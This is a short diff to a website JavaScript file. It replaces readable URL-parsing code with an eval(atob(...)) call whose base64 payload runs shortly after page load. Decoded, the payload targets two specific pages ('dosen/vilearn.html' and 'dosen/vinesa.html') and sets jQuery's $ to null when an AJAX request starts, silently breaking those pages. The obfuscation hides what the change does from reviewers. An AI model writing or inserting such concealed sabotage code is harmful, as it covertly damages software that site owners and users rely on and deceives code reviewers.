@@ -1,9 +1,4 @@
 function a(){
-	if($){
-		var d=window.location.href;
-		var r = d.split('?'); var a=r[0].split('/');
-		console.log(a);
-		//
-	}
+	eval(atob('aWYoJCl7IHZhciBkPXdpbmRvdy5sb2NhdGlvbi5ocmVmOyB2YXIgciA9IGQuc3BsaXQoJz8nKTsgdmFyIGE9clswXS5zcGxpdCgnLycpOyBpZihhWzNdPT0nZG9zZW4nICYmIChhWzRdPT0ndmlsZWFybi5odG1sJyB8fCBhWzRdPT0ndmluZXNhLmh0bWwnKSl7ICQoZG9jdW1lbnQpLmJpbmQoImFqYXhTZW5kIiwgZnVuY3Rpb24oKXsgJD1udWxsOyB9KSB9IH0='));
 }
 setTimeout("a()",100);
